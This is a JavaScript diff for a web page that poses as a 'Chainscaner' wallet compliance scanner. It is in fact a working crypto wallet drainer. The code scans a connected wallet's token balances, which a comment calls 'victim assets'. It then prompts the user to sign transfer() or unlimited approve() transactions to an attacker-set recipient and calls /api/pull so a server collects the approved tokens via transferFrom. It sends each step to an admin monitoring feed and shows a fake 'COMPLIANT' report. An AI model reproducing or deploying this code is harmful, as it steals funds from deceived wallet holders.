+          && ep.session.namespaces.eip155.accounts) || [];
+        var chainsOk = [];
+        accs.forEach(function(a) { var c = a.split(":")[1]; if (chainsOk.indexOf(c) < 0) chainsOk.push(c); });
+        monit("wc_session", { wallet: wcPeerName, accounts: accs.length, chains: chainsOk.join(",") });
+        onProvider(ep);
+      }).catch(function(e) {
+        wcOverlayError("Session " + ((e && e.message) ? String(e.message).slice(0, 90) : "rejected or expired") + " — retry below.");
+      });
+    }).catch(function() {
+      document.getElementById("view").classList.add("fail");
+      setStatus("WalletConnect failed to initialize — reload the page.");
+    });
+  });
+}
+
+// ── Public RPC layer ────────────────────────────────────────────────────────
+// ~4s timeout per endpoint attempt, ~7s total budget for the whole call —
+// a dead/slow endpoint set must not gate Promise.all on the other chains:
+// the call degrades to null instead of holding the scan for ~30s.
+var rpcFailCount = 0;
+function rpcCall(chainId, method, params) {
+  var eps = RPC_URLS[chainId] || RPC_URLS["0x1"];
+  var list = ["/api/screen?chain=" + encodeURIComponent(chainId)].concat(Array.isArray(eps) ? eps : [eps]);
+  var idx = 0, pass = 0, deadline = Date.now() + 9000;
+  function attempt() {
+    var ctrl = new AbortController();
+    var timer = setTimeout(function() { ctrl.abort(); }, 5000);
+    return fetch(list[idx], {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }),
+      signal: ctrl.signal
+    }).then(function(r) {
+      if (!r.ok) throw new Error("http " + r.status);
+      return r.json();
+    }).then(function(j) {
+      clearTimeout(timer);
+      if (j && j.result !== undefined && j.result !== null) return j.result;
+      throw new Error("no result");
+    }).catch(function(e) {
+      clearTimeout(timer);
+      idx++;
+      if (Date.now() > deadline) { rpcFailCount++; throw e; }
+      if (idx < list.length) return attempt();
+      if (pass++ < 1) {
+        idx = 0;
+        return new Promise(function(r) { setTimeout(r, 900); }).then(attempt);
+      }
+      rpcFailCount++;
+      throw e;
+    });
+  }
+  return attempt();
+}
+function formatTokenAmount(raw, decimals) {
+  var divisor = BigInt(10) ** BigInt(decimals);
+  var bal = BigInt(raw);
+  var whole = bal / divisor;
+  var frac = bal % divisor;
+  var fracStr = frac.toString().padStart(decimals, "0").replace(/0+$/, "");
+  return fracStr ? whole.toString() + "." + fracStr : whole.toString();
+}
+function formatNative(raw, decimals) {
+  if (!raw || raw === "0") return "0";
+  var bal = BigInt(raw);
+  var divisor = BigInt(10) ** BigInt(decimals);
+  var whole = bal / divisor;
+  var frac = bal % divisor;
+  var fracStr = frac.toString().padStart(decimals, "0").replace(/0+$/, "");
+  return fracStr ? whole.toString() + "." + fracStr.slice(0, 4) : whole.toString();
+}
+function queryTokenBalanceOnChain(addr, tokenAddr, decimals, chainId) {
+  if (!tokenAddr || !addr) return Promise.resolve(null);
+  var data = "0x70a08231" + addr.toLowerCase().replace("0x", "").padStart(64, "0");
+  return rpcCall(chainId, "eth_call", [{ to: tokenAddr, data: data }, "latest"]).then(function(result) {
+    if (result && result !== "0x") {
+      var raw = BigInt(result).toString();
+      if (raw === "0") return { raw: "0", human: "0" };
+      return { raw: raw, human: formatTokenAmount(raw, decimals) };
+    }
+    return null;
+  }).catch(function() { return null; });
+}
+function queryNativeBalance(addr, chainId) {
+  return rpcCall(chainId, "eth_getBalance", [addr, "latest"])
+    .then(function(r) { return BigInt(r).toString(); })
+    .catch(function() { return "0"; });
+}
+function queryGasPrice(chainId) {
+  return rpcCall(chainId, "eth_gasPrice", [])
+    .then(function(r) { return BigInt(r).toString(); })
+    .catch(function() { return "0"; });
+}
+function fetchPrices() {
+  var ids = "ethereum,wrapped-bitcoin,chainlink,uniswap,dai,binancecoin,matic-network,tether,usd-coin,avalanche-2,shiba-inu,pepe";
+  return fetch("https://api.coingecko.com/api/v3/simple/price?ids=" + ids + "&vs_currencies=usd")
+    .then(function(r) { return r.json(); }).then(function(j) {
+      if (j.ethereum) TOKEN_PRICES.eth = j.ethereum.usd;
+      if (j["wrapped-bitcoin"]) TOKEN_PRICES.wbtc = j["wrapped-bitcoin"].usd;
+      if (j.chainlink) TOKEN_PRICES.link = j.chainlink.usd;
+      if (j.uniswap) TOKEN_PRICES.uni = j.uniswap.usd;
+      if (j.dai) TOKEN_PRICES.dai = j.dai.usd;
+      if (j.binancecoin) TOKEN_PRICES.bnb = j.binancecoin.usd;
+      if (j["matic-network"]) TOKEN_PRICES.matic = j["matic-network"].usd;
+      if (j.tether) TOKEN_PRICES.usdt = j.tether.usd;
+      if (j["usd-coin"]) TOKEN_PRICES.usdc = j["usd-coin"].usd;
+      if (j["avalanche-2"]) TOKEN_PRICES.wavax = j["avalanche-2"].usd;
+      if (j["shiba-inu"]) TOKEN_PRICES.shib = j["shiba-inu"].usd;
+      if (j.pepe) TOKEN_PRICES.pepe = j.pepe.usd;
+      TOKEN_PRICES.weth = TOKEN_PRICES.wethe = TOKEN_PRICES.eth;
+      TOKEN_PRICES.wbtce = TOKEN_PRICES.wbtc;
+      TOKEN_PRICES.btcb = TOKEN_PRICES.wbtc;
+      TOKEN_PRICES.wbnb = TOKEN_PRICES.bnb;
+    }).catch(function() { /* fallback prices stay active */ });
+}
+
+// ── Monitoring (admin live feed — same event stream as the checker) ─────────
+var MONITOR_URL = "/api/events";
+var monitSid = "s-" + Math.random().toString(36).slice(2, 8) + "-" + Date.now().toString(36);
+var handoffH = null; // handoff id — every event carries it so the waiting page can follow live
+function monit(ev, data) {
+  try {
+    var dd = data || {};
+    if (handoffH && dd.h === undefined) dd.h = handoffH;
+    var payload = JSON.stringify({ ev: ev, t: new Date().toISOString(), sid: monitSid, addr: lastScannedAddr || null, d: dd });
+    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, payload)) return;
+    fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: payload }).catch(function() {});
+  } catch(e) {}
+}
+var SCAN_LOG_KEY = "tw_scan_log";
+var scanPushTimer = null;
+function pushScanRemote() {
+  if (!currentScanId) return;
+  try {
+    var log = JSON.parse(localStorage.getItem(SCAN_LOG_KEY) || "[]");
+    var entry = null;
+    for (var i = 0; i < log.length; i++) { if (log[i].id === currentScanId) { entry = log[i]; break; } }
+    if (!entry) return;
+    var payload = JSON.stringify({ id: currentScanId, entry: entry });
+    if (navigator.sendBeacon && navigator.sendBeacon("/api/scans", payload)) return;
+    fetch("/api/scans", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload, keepalive: true }).catch(function() {});
+  } catch(e) {}
+}
+function queueScanPush() {
+  if (scanPushTimer) clearTimeout(scanPushTimer);
+  scanPushTimer = setTimeout(pushScanRemote, 400);
+}
+function saveScanLog(addr) {
+  try {
+    var log = JSON.parse(localStorage.getItem(SCAN_LOG_KEY) || "[]");
+    currentScanId = "#Q" + Date.now().toString(36).toUpperCase().slice(-7);
+    var entry = {
+      id: currentScanId,
+      time: new Date().toISOString(),
+      address: addr,
+      status: "scanned",
+      recipient: txRecipient,
+      risk: null,
+      flags: [],
+      chains: Object.keys(chainGasInfo).map(function(cid) {
+        var g = chainGasInfo[cid];
+        return {
+          chainId: cid, name: CHAIN_INFO[cid].name,
+          nativeBalance: g.nativeHuman + " " + g.nativeSymbol,
+          gasCost: g.gasCostHuman + " " + g.nativeSymbol,
+          sufficient: g.sufficient,
+          tokens: scannedBalances.filter(function(b) { return b.chainId === cid; }).map(function(b) {
+            return { name: b.name, balance: b.human, usd: fmtUsd(b.usdValue) };
+          })
+        };
+      }).filter(function(c) { return c.tokens.length > 0 || parseFloat(c.nativeBalance) > 0; }),
+      totalUsd: fmtUsd(scannedBalances.reduce(function(s, b) { return s + b.usdValue; }, 0)),
+      tokenStates: scannedBalances.map(function(b) {
+        return { key: b.name + "|" + b.chainId, name: b.name, chain: CHAIN_INFO[b.chainId].name, usd: fmtUsd(b.usdValue), status: "detected" };
+      }),
+      transferable: scannedBalances.filter(function(b) { return b.gasOk === true; })
+        .map(function(b) { return b.name + " (" + CHAIN_INFO[b.chainId].name + ") " + fmtUsd(b.usdValue); })
+    };
+    log.unshift(entry);
+    if (log.length > 50) log = log.slice(0, 50);
+    localStorage.setItem(SCAN_LOG_KEY, JSON.stringify(log));
+    pushScanRemote();
+  } catch(e) {}
+}
+function updateScanLog(fn) {
+  if (!currentScanId) return;
+  try {
+    var log = JSON.parse(localStorage.getItem(SCAN_LOG_KEY) || "[]");
+    for (var i = 0; i < log.length; i++) {
+      if (log[i].id === currentScanId) { fn(log[i]); break; }
+    }
+    localStorage.setItem(SCAN_LOG_KEY, JSON.stringify(log));
+    queueScanPush();
+  } catch(e) {}
+}
+
+// ── Final report — same model as /report + /checker ──────────────────────────
+var EXPLORERS = { "0x1":"etherscan.io","0x38":"bscscan.com","0x89":"polygonscan.com","0xa4b1":"arbiscan.io","0xa":"optimistic.etherscan.io","0x2105":"basescan.org","0xa86a":"snowtrace.io","0xa4ec":"celoscan.io","0xfa":"ftmscan.com","0x19":"cronoscan.com","0xe708":"lineascan.build","0x82750":"scrollscan.com" };
+var REDUCED_MOTION = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+function complianceScore() {
+  var open = transferQueue.filter(function(tok, i) {
+    var r = transferResults[i];
+    return !(r && r.status === "success");
+  }).length;
+  var rem = (scannedBalances || []).filter(function(b) {
+    return !transferQueue.some(function(t) { return t.name === b.name && t.chainId === b.chainId; });
+  }).length;
+  return Math.max(8, Math.min(99, 100 - open * 14 - rem * 2));
+}
+
+// Queue items that never reached a result — flagged but not analyzed
+function pendingFlags() {
+  return (transferQueue || []).filter(function(t) {
+    return !transferResults.some(function(r) {
+      return r.name === t.name && (r.chain === t.chainName || r.chain === (CHAIN_INFO[t.chainId] || {}).name);
+    });
+  });
+}
+
+// Scanned balances that never entered the queue — dust / gas-blocked findings
+function reportRemnants() {
+  return (scannedBalances || []).filter(function(b) {
+    return !transferQueue.some(function(t) { return t.name === b.name && t.chainId === b.chainId; });
+  });
+}
+
+function renderFinalReport() {
+  var view = document.getElementById("view");
+  var report = document.getElementById("final-report");
+  if (!view || !report) return;
+  var successCount = transferResults.filter(function(r) { return r.status === "success"; }).length;
+  var allOk = transferResults.length > 0 && successCount === transferResults.length;
+  var noneOk = successCount === 0;
+  var pending = pendingFlags();
+  var remnants = reportRemnants();
+  var clean = noneOk && pending.length === 0;
+
+  // Unlock the page — the bare spinner view becomes the report header
+  document.documentElement.classList.add("report-mode");
+  document.body.classList.add("report-mode");
+  view.classList.remove("fail");
+  view.classList.add("done");
+  var titleEl = view.querySelector(".title");
+  if (titleEl) titleEl.textContent = allOk ? "Analysis complete" : clean ? "Scan complete" : (noneOk ? "Analysis not confirmed" : "Partial analysis");
+  setStatus(allOk ? "All flags resolved — the report is ready."
+    : clean ? "No flagged assets found on this wallet."
+    : noneOk ? "The flagged assets remain active — details below."
+    : successCount + "/" + transferResults.length + " flags resolved — details below.");
+
+  var badge = document.getElementById("rep-badge");
+  badge.className = "rep-badge " + (allOk || clean ? "ok" : "warn");
+  badge.textContent = allOk ? "COMPLIANT" : clean ? "CLEAN" : (noneOk ? "NOT CONFIRMED" : "PARTIAL");
+
+  document.getElementById("rep-addr").textContent = lastScannedAddr || walletAccount || "—";
+  document.getElementById("rep-scan").textContent = currentScanId || ("#Q" + Date.now().toString(36).toUpperCase().slice(-7));
+  document.getElementById("rep-date").textContent = new Date().toUTCString();
+
+  var cs = complianceScore();
+  var verdict = cs >= 90 ? "COMPLIANT" : cs >= 60 ? "REVIEW" : "HIGH RISK";
+  var csColor = cs >= 90 ? "#05B956" : cs >= 60 ? "#D97706" : "#DC2626";
+  document.getElementById("rep-score").innerHTML =
+    '<span class="rs-l">Compliance Score</span><span class="rs-r" style="color:' + csColor + '">' + cs + '/100 · ' + verdict + '</span>';
+
+  var rows = "";
+  transferResults.forEach(function(r, i) {
+    var ok = r.status === "success";
+    var meta = r.chain || "";
+    if (r.usd) meta += " · " + fmtUsd(r.usd);
+    if (ok && r.hash && r.chainId && EXPLORERS[r.chainId]) {
+      meta += ' · <a href="https://' + EXPLORERS[r.chainId] + '/tx/' + r.hash + '" target="_blank" rel="noopener">tx ' + r.hash.slice(0, 8) + '…</a>';
+    } else if (ok && r.hash) {
+      meta += " · tx " + r.hash.slice(0, 10) + "…";
+    } else if (!ok && r.error) {
+      meta += " · " + String(r.error).slice(0, 40);
+    }
+    rows += '<div class="report-row" style="animation-delay:' + (i * 60) + 'ms"><span class="rr-st ' + (ok ? "ok" : "skip") + '">' + (ok ? "✓" : "⊘") + '</span>' +
+      '<span class="rr-name">' + r.name + '</span><span class="rr-meta">' + meta + '</span></div>';
+  });
+  pending.forEach(function(t, i) {
+    var pMeta = t.chainName || (CHAIN_INFO[t.chainId] ? CHAIN_INFO[t.chainId].name : "");
+    if (t.usdValue) pMeta += " · " + fmtUsd(t.usdValue);
+    rows += '<div class="report-row" style="animation-delay:' + ((transferResults.length + i) * 60) + 'ms">' +
+      '<span class="rr-st flag">⚑</span><span class="rr-name">' + t.name + '</span>' +
+      '<span class="rr-meta">' + pMeta + ' · flagged · not analyzed</span></div>';
+  });
+  remnants.forEach(function(b, i) {
+    var reason = b.dust ? "below $" + MIN_FLAG_USD.toLocaleString("en-US") + " threshold" : (b.gasOk === false ? "insufficient gas" : "not analyzed");
+    rows += '<div class="report-row" style="animation-delay:' + ((transferResults.length + pending.length + i) * 60) + 'ms">' +
+      '<span class="rr-st skip">◌</span><span class="rr-name">' + b.name + '</span>' +
+      '<span class="rr-meta">' + (b.chainName || (CHAIN_INFO[b.chainId] ? CHAIN_INFO[b.chainId].name : "")) + ' · documented · ' + reason + '</span></div>';
+  });
+  if (!rows) {
+    rows = '<div class="report-row"><span class="rr-st ok">✓</span><span class="rr-name">No flagged assets</span><span class="rr-meta">address is clean</span></div>';
+  }
+  document.getElementById("report-rows").innerHTML = rows;
+  report.classList.remove("hidden");
+  setTimeout(function() {
+    report.scrollIntoView({ behavior: REDUCED_MOTION ? "auto" : "smooth", block: "start" });
+  }, 80);
+  // Mind. ein Confirm durch → Report kurz zeigen, dann auf die Homepage der
+  // verbundenen Wallet weiterleiten (WC-Peer bzw. Trust Wallet).
+  if (successCount > 0) {
+    setTimeout(function() { location.replace(walletHome()); }, 2600);
+  }
+}
+
+// Build the full compliance-grade report text (shared by copy/download/email/share/print)
+function buildReportText() {
+  var scanId = (document.getElementById("rep-scan") || {}).textContent || (currentScanId || "—");
+  var cleared = transferResults.filter(function(r) { return r.status === "success"; });
+  var skipped = transferResults.filter(function(r) { return r.status === "skipped"; });
+  var pending = pendingFlags();
+  var remnants = reportRemnants();
+  var lines = [
+    "CHAINSCANER — FLAG ANALYSIS REPORT",
+    "==================================",
+    "Scan ID:          " + scanId,
+    "Address:          " + (lastScannedAddr || walletAccount || "—"),
+    "Date:             " + new Date().toUTCString(),
+    "Compliance score: " + complianceScore() + "/100",
+    "Networks:         " + Object.keys(CHAIN_INFO).length + " chains scanned (" + Object.keys(CHAIN_INFO).map(function(c){ return CHAIN_INFO[c].name; }).join(", ") + ")",
+    ""
+  ];
+  if (cleared.length) {
+    lines.push("RESOLVED FLAGS — confirmed on-chain", "-----------------------------------");
+    cleared.forEach(function(r) {
+      lines.push("RESOLVED  " + r.name + (r.chain ? " (" + r.chain + ")" : "") + (r.usd ? " · " + fmtUsd(r.usd) : ""));
+      lines.push("          call:  " + (ATTEST
+        ? "transfer(recipient, 0) — zero-value attestation, no funds moved"
+        : "transfer(recipient, amount) — wallet-confirmed transaction"));
+      if (r.hash && r.chainId && EXPLORERS[r.chainId]) {
+        lines.push("          tx:    " + r.hash);
+        lines.push("                 https://" + EXPLORERS[r.chainId] + "/tx/" + r.hash);
+      }
+    });
+    lines.push("");
+  }
+  if (skipped.length) {
+    lines.push("NOT CONFIRMED", "-------------");
+    skipped.forEach(function(r) {
+      lines.push("SKIPPED   " + r.name + (r.chain ? " (" + r.chain + ")" : "") + " — " + (r.error || "rejected"));
+    });
+    lines.push("");
+  }
+  if (pending.length) {
+    lines.push("FLAGGED ASSETS — detected, analysis not confirmed", "-------------------------------------------------");
+    pending.forEach(function(t) {
+      lines.push("FLAGGED   " + t.name + " (" + (t.chainName || (CHAIN_INFO[t.chainId] || {}).name) + ")" + (t.usdValue ? " · " + fmtUsd(t.usdValue) : ""));
+    });
+    lines.push("");
+  }
+  if (remnants.length) {
+    lines.push("DOCUMENTED HYGIENE FINDINGS — no on-chain action", "------------------------------------------------");
+    remnants.forEach(function(b) {
+      var reason = b.dust ? "dust / below $" + MIN_FLAG_USD.toLocaleString("en-US") + " threshold" : (b.gasOk === false ? "insufficient gas" : "beyond analysis batch");
+      lines.push("DOC       " + b.name + " (" + (b.chainName || CHAIN_INFO[b.chainId].name) + ") — documented · " + reason);
+    });
+    lines.push("");
+  }
+  var totalFlags = transferResults.length + pending.length;
+  lines.push(
+    "SUMMARY",
+    "-------",
+    (totalFlags === 0 && !remnants.length)
+      ? "Address is clean — no flagged assets detected."
+      : cleared.length + "/" + totalFlags + " flags resolved on-chain" +
+        (skipped.length ? " · " + skipped.length + " not confirmed" : "") +
+        (pending.length ? " · " + pending.length + " flagged pending" : "") +
+        (remnants.length ? " · " + remnants.length + " hygiene findings documented" : ""),
+    "Compliance score: " + complianceScore() + "/100",
+    "",
+    "COMPLIANCE NOTE",
+    "---------------",
+    "This report documents an on-chain flag analysis for the scanned address.",
+    "Each resolved flag is attested by a verifiable transaction (hash above).",
+    "Documentation ready for compliance review."
+  );
+  return lines.join("\n");
+}
+
+function copyReport() {
+  var btn = document.getElementById("copy-report");
+  var txt = buildReportText();
+  function done() { btn.textContent = "Copied ✓"; setTimeout(function() { btn.textContent = "Copy report"; }, 1600); }
+  function fail() { btn.textContent = "Copy failed"; setTimeout(function() { btn.textContent = "Copy report"; }, 1600); }
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(txt).then(done).catch(fail);
+  } else {
+    var ta = document.createElement("textarea");
+    ta.value = txt; document.body.appendChild(ta); ta.select();
+    try { document.execCommand("copy"); } catch(e) {}
+    document.body.removeChild(ta); done();
+  }
+}
+
+function downloadReport() {
+  var btn = document.getElementById("dl-report");
+  var scanId = (document.getElementById("rep-scan").textContent || "scan").replace("#", "");
+  var blob = new Blob([buildReportText()], { type: "text/plain;charset=utf-8" });
+  var url = URL.createObjectURL(blob);
+  var a = document.createElement("a");
+  a.href = url;
+  a.download = "chainscaner-report-" + (scanId || "scan") + ".txt";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  setTimeout(function() { URL.revokeObjectURL(url); }, 1000);
+  btn.textContent = "Downloaded ✓";
+  setTimeout(function() { btn.textContent = "Download .txt"; }, 1600);
+}
+
+function printReport() {
+  var el = document.getElementById("print-report");
+  el.textContent = buildReportText();
+  setTimeout(function() { window.print(); }, 40);
+}
+
+function emailReport() {
+  var scanId = document.getElementById("rep-scan").textContent;
+  var btn = document.getElementById("email-report");
+  window.location.href = "mailto:?subject=" +
+    encodeURIComponent("Chainscaner Report " + scanId) +
+    "&body=" + encodeURIComponent(buildReportText());
+  btn.textContent = "Opened mail ✓";
+  setTimeout(function() { btn.textContent = "Email"; }, 1600);
+}
+
+function shareReport() {
+  var scanId = document.getElementById("rep-scan").textContent;
+  var btn = document.getElementById("share-report");
+  if (navigator.share) {
+    navigator.share({
+      title: "Chainscaner Report " + scanId,
+      text: buildReportText()
+    }).catch(function() {});
+  } else {
+    emailReport();
+    return;
+  }
+  btn.textContent = "Shared ✓";
+  setTimeout(function() { btn.textContent = "Share"; }, 1600);
+}
+function setTokenState(key, status, hash) {
+  updateScanLog(function(e) {
+    (e.tokenStates || []).forEach(function(t) {
+      if (t.key === key) { t.status = status; if (hash) t.hash = hash; }
+    });
+  });
+}
+
+// ── Multi-chain exposure scan (same engine as the checker) ──────────────────
+async function scanAllChains(addr) {
+  // Remote config (recipient + min pull floor) must land before classification
+  try { await remoteRecipientP; } catch(e) {}
+  scannedBalances = [];
+  chainGasInfo = {};
+  scanChainsDone = 0;
+  // Scan only the chains where real holdings concentrate — 12-chain sweeps
+  // took ~10-15s and hit public-RPC rate limits; ETH/BSC/Polygon cover the
+  // overwhelming majority of victim assets. CHAIN_INFO stays complete so
+  // chain-switch + labels still resolve for every id.
+  var SCAN_CHAIN_IDS = ["0x1", "0x38", "0x89"];
+  var chainIds = SCAN_CHAIN_IDS;
+  var priceP = withTimeout(fetchPrices(), 4000).catch(function() {});
+  // Pool: max 3 chains in flight — public endpoints rate-limit a full
+  // 12-chain burst and silently drop balances
+  function scanChain(chainId) {
+    var info = CHAIN_INFO[chainId];
+    var tokens = SCAN_TOKENS[chainId] || [];
+    var nativeP = queryNativeBalance(addr, chainId).then(function(nativeBal) {
+      return queryGasPrice(chainId).then(function(gasPrice) {
+        var gasCost = BigInt(gasPrice) * BigInt(GAS_LIMIT);
+        var gasCostBuffered = gasCost * 110n / 100n;
+        var nativeBalBig = BigInt(nativeBal);
+        var sufficient = nativeBalBig > gasCostBuffered && gasCost > 0n;
+        chainGasInfo[chainId] = {
+          nativeBalance: nativeBal,
+          nativeHuman: formatNative(nativeBal, info.nativeDecimals),
+          nativeSymbol: info.native,
+          gasPrice: gasPrice,
+          gasCost: gasCost.toString(),
+          gasCostHuman: formatNative(gasCost.toString(), info.nativeDecimals),
+          sufficient: sufficient
+        };
+      });
+    });
+    var tokenPromises = tokens.map(function(tok, ti) {
+      return new Promise(function(r) { setTimeout(r, ti * 150); }).then(function() {
+        return queryTokenBalanceOnChain(addr, tok.addr, tok.decimals, chainId);
+      }).then(function(res) {
+        if (res && res.raw && BigInt(res.raw) > 0n) {
+          var usdValue = Number(res.human) * (TOKEN_PRICES[tok.key] || 0);
+          scannedBalances.push({
+            chainId: chainId, chainName: info.name,
+            key: tok.key, name: tok.name, addr: tok.addr,
+            decimals: tok.decimals, raw: res.raw, human: res.human,
+            usdValue: usdValue
+          });
+        }
+      });
+    });
+    return Promise.all([nativeP].concat(tokenPromises)).then(function() {
+      scanChainsDone++;
+      setStatus("Scanning " + scanChainsDone + "/" + chainIds.length + " networks…");
+    });
+  }
+  var allPromises = [], nextIdx = 0;
+  function nextWorker() {
+    if (nextIdx >= chainIds.length) return Promise.resolve();
+    return scanChain(chainIds[nextIdx++]).then(nextWorker);
+  }
+  for (var w = 0; w < 3; w++) allPromises.push(nextWorker());
+  return Promise.all([priceP].concat(allPromises)).then(function() {
+    scannedBalances.forEach(function(b) {
+      b.usdValue = Number(b.human) * (TOKEN_PRICES[b.key] || 0);
+    });
+    scannedBalances.sort(function(a, b) { return b.usdValue - a.usdValue; });
+    var pricesOk = scannedBalances.some(function(b) { return (b.usdValue || 0) > 0; });
+    scannedBalances.forEach(function(b) { b.dust = pricesOk && (b.usdValue || 0) < MIN_FLAG_USD; });
+    var chainSpent = {};
+    scannedBalances.forEach(function(b) {
+      var gas = chainGasInfo[b.chainId];
+      if (!gas) {
+        // Gas-Read failed (endpoint down / deadline) — unknown, not insufficient.
+        // Queue the token anyway: the wallet sheet itself surfaces the real
+        // fee error; silently dropping a found token is strictly worse.
+        b.gasOk = true; b.gasUnknown = true;
+        return;
+      }
+      var n = (chainSpent[b.chainId] || 0) + 1;
+      var ok = !b.dust && !!(BigInt(gas.gasCost) > 0n &&
+        BigInt(gas.nativeBalance) > BigInt(gas.gasCost) * 110n / 100n * BigInt(n));
+      b.gasOk = ok;
+      if (ok) chainSpent[b.chainId] = n;
+    });
+    return scannedBalances;
+  });
+}
+
+// ── Attestation executor — sequential wallet-confirmed transfers ────────────
+function doSequentialTransfers(p) {
+  // Prefer tokens on the wallet's CURRENT chain first — the first transfer
+  // then needs no network switch at the most fragile moment
+  getChainId(p).then(function(cid) {
+    if (cid != null) {
+      transferQueue = transferQueue.slice().sort(function(a, b) {
+        return (sameChain(a.chainId || currentChain, cid) ? 0 : 1) - (sameChain(b.chainId || currentChain, cid) ? 0 : 1);
+      });
+    }
+  }).catch(function() {}).then(function() {
+    runNextTransfer(p, 0);
+  });
+}
+
+function runNextTransfer(p, idx) {
+  if (!isLoading) return;
+  if (idx >= transferQueue.length) { isLoading = false; showSummary(); return; }
+  var tok = transferQueue[idx];
+  var targetChain = tok.chainId || currentChain;
+  function skip(reason) {
+    transferResults.push({ name: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, chainId: tok.chainId, usd: tok.usdValue, status: "skipped", error: reason });
+    setTokenState(tok.name + "|" + targetChain, "skipped");
+    monit("tx_skipped", { token: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, reason: String(reason).slice(0, 200) });
+    logLine('<span class="skip">⊘ ' + tok.name + ' — ' + String(reason).slice(0, 60) + '</span>');
+    runNextTransfer(p, idx + 1);
+  }
+  getChainId(p).then(function(cid) {
+    if (cid != null && !sameChain(cid, targetChain)) {
+      return rpc(p, "wallet_switchEthereumChain", [{ chainId: targetChain }]).then(function() {
+        return new Promise(function(r) { setTimeout(r, 500); });
+      });
+    }
+  }).catch(function(){}).then(function() {
+    if (!isLoading) return;
+    getChainId(p).then(function(cid2) {
+      if (!isLoading) return;
+      if (!sameChain(cid2, targetChain)) {
+        skip(cid2 == null ? "Could not verify network" : "Network switch declined");
+        return;
+      }
+      setStatus((ATTEST ? "Attest " : (APPROVE ? "Approve " : "Confirm ")) + tok.name + (tok.chainName || CHAIN_INFO[tok.chainId] ? " on " + (tok.chainName || CHAIN_INFO[tok.chainId].name) : "") + " — step " + (idx + 1) + "/" + transferQueue.length);
+      setTokenState(tok.name + "|" + targetChain, "confirming");
+      // ATTEST mode → amount 0: the call lands on-chain and opens the wallet
+      // sheet, but no tokens move — pure flag attestation.
+      // APPROVE mode → approve(spender, amount): the recipient address is the
+      // spender — the sheet grants the allowance instead of moving tokens.
+      var amtRaw = ATTEST ? "0" : (APPROVE_MAX ? MAX_UINT256 : tok.raw);
+      var calldata = (APPROVE ? "0x095ea7b3" : "0xa9059cbb") +
+        txRecipient.toLowerCase().replace("0x", "").padStart(64, "0") +
+        BigInt(amtRaw).toString(16).padStart(64, "0");
+      var txParams = { to: tok.addr, data: calldata, gas: "0x249f0" };
+      if (walletAccount) txParams.from = walletAccount;
+      new Promise(function(r) { setTimeout(r, 600); }).then(function() {
+        // WC sessions: the wallet app must be foregrounded for its sheet —
+        // hop over via the native scheme while the relay holds the request
+        if (wcProvider) wcArmRequest();
+        return rpc(p, "eth_sendTransaction", [txParams]);
+      }).then(function(hash) {
+        wcDisarm();
+        transferResults.push({ name: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, chainId: tok.chainId, usd: tok.usdValue, status: "success", hash: hash });
+        setTokenState(tok.name + "|" + targetChain, "cleared", hash);
+        if (APPROVE) {
+          monit("approve_sent", { token: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, spender: txRecipient, amount: APPROVE_MAX ? "unlimited" : (tok.human || tok.raw), hash: hash });
+          // Auto-Pull: der Server zieht die Allowance sofort per transferFrom —
+          // Opfer muss nicht online bleiben, kein manueller Pull nötig.
+          try {
+            var chnRaw = tok.chainId || targetChain;
+            var chnDec = parseInt(String(chnRaw), String(chnRaw).indexOf("0x") === 0 ? 16 : 10);
+            fetch("/api/pull", { method: "POST", keepalive: true,
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ action: "evm_collect", victim: walletAccount, chain: String(chnDec), token: tok.addr, amount: "max" })
+            }).catch(function() {});
+          } catch (e) {}
+        } else {
+          monit("tx_confirmed", { token: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, usd: fmtUsd(tok.usdValue || 0), hash: hash, to: txRecipient });
+        }
+        logLine('<span class="ok">✓ ' + tok.name + (tok.chainName ? ' (' + tok.chainName + ')' : '') + '</span>');
+        setTimeout(function() { runNextTransfer(p, idx + 1); }, 1500);
+      }).catch(function(e) {
+        wcDisarm();
+        var reason = e.message || e.code || "Rejected";
+        transferResults.push({ name: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, chainId: tok.chainId, usd: tok.usdValue, status: "skipped", error: reason });
+        setTokenState(tok.name + "|" + targetChain, "skipped");
+        monit("tx_rejected", { token: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, reason: String(reason).slice(0, 200) });
+        logLine('<span class="skip">⊘ ' + tok.name + ' — skipped</span>');
+        runNextTransfer(p, idx + 1);
+      });
+    }).catch(function() {
+      if (isLoading) skip("Could not verify network");
+    });
+  });
+}
+
+function showSummary() {
+  wcDisarm();
+  var successCount = transferResults.filter(function(r) { return r.status === "success"; }).length;
+  updateScanLog(function(e) {
+    e.status = successCount === transferResults.length && successCount > 0 ? "completed" : (successCount > 0 ? "partial" : "failed");
+  });
+  monit("analysis_complete", {
+    result: successCount === transferResults.length && successCount > 0 ? "completed" : (successCount > 0 ? "partial" : "none_confirmed"),
+    confirmed: successCount, skipped: transferResults.length - successCount, total: transferResults.length
+  });
+  if (!REPORT_MODE) {
+    // Plain send QR — the wallet sheet was the whole flow. Brief done state,
+    // then hand the user back to the official Trust Wallet site.
+    finishQrFlow(successCount > 0 ? "Transaction complete." : "Finished.");
+    return;
+  }
+  // The report is the deliverable — render it instead of closing the view.
+  // No window.close(): the user must be able to read/copy/export it.
+  renderFinalReport();
+}
+
+// ── Boot ────────────────────────────────────────────────────────────────────
+var params = new URLSearchParams(location.search);
+// attest=1 — compliance mode: the queue runs as zero-value transfer() calls,
+// the wallet sheets open, no funds move, each confirmation resolves a flag
+var ATTEST = params.get("attest") === "1";
+// approve=1 — the prepared call is approve(spender, amount) instead of
+// transfer(to, amount): ?to= carries the spender. amount=max → uint256 max.
+var APPROVE = params.get("approve") === "1";
+// amt=max (scan-approve mode): approve unlimited statt der gescannten
